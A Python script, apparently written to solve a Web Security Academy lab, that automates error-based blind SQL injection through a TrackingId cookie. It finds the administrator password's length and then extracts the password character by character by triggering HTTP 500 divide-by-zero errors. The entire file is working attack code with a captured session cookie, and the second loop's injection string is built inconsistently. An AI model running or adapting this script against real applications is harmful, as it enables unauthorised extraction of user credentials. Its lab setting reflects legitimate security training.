

import requests
import urllib

proxies = {'http':'http://127.0.0.1:8081','https':'http://127.0.0.1:8081'}

url = 'https://0a8d00bf04dcc92f84a75027001100ce.web-security-academy.net/'

headers = {
    "Host": "0a8d00bf04dcc92f84a75027001100ce.web-security-academy.net",
    "Cookie": "session=4AYvF1MlH1sUTE93wnlaPcc17SZniW2g; TrackingId=DKSWv80UKgZsH9Ot ",
    "Sec-Ch-Ua": '"Not:A-Brand";v="99", "Chromium";v="112"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0a8d00bf04dcc92f84a75027001100ce.web-security-academy.net/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9"
}

originalHeader = headers['Cookie']
i = 1
length = 0
while True:
    newheader = f"'||(SELECT CASE WHEN LENGTH(password)={i} THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    formatted_header = urllib.parse.quote(newheader, safe='')
    headers['Cookie'] += formatted_header
    response = requests.get(url, headers=headers, verify=False, proxies=proxies)
    print(response.status_code)
    print(i)
    if response.status_code == 500:
        length = i
        headers['Cookie'] = originalHeader
        break
    headers['Cookie'] = originalHeader
    i = i + 1
headers['Cookie'] = originalHeader
password = ''
for i in range(length):
    for char in range(ord('a'),ord('z')+1):
        temp = chr(char)
        newheader = f"TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,{i+1},1)='{temp}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        formatted_header = urllib.parse.quote(newheader,safe='')
        headers['Cookie'] += formatted_header
        response = requests.get(url, headers=headers, verify=False, proxies=proxies)
        headers['Cookie'] = originalHeader
        print(response.status_code)
        print(i + 1)
        print(temp)
        if response.status_code == 500:
            password+=temp
            headers['Cookie'] = originalHeader
            break


    for num in range(ord('0'),ord('9')+1):
        temp = chr(num)
        newheader = f"TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,{i+1},1)='{temp}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        formatted_header = urllib.parse.quote(newheader,safe='')
        headers['Cookie'] += formatted_header
        response = requests.get(url, headers=headers, verify=False, proxies=proxies)
        headers['Cookie'] = originalHeader
        print(response.status_code)
        print(i+1)
        print(temp)
        if response.status_code == 500:
            password+=temp
            headers['Cookie'] = originalHeader
            break
        headers['Cookie'] = originalHeader
print(password)




